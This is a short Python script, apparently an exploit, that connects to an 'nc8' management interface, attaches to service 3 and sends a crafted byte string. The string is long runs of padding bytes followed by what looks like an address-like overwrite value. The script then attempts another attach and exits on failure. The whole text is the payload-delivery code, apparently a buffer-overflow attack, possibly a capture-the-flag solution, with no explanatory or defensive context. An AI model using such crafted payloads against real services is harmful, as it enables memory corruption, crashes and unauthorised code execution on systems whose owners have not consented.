import os
from nc8.management_interface import ManagementInterface

iface = ManagementInterface()

iface.connect()
iface.attach_to_service(3)
c = ((0x62,)*2 + (0x10,)*62)*450+(0x61, 0x62)*32*58+(0x50, 0x04, 0xce)+(0x10,)*34+(0x11,)

iface.send(''.join(map(chr, c)))
try:
    iface.attach()
except:
    while True:
        try:
            os._exit(0)
        except KeyboardInterrupt:
            pass
        except:
            pass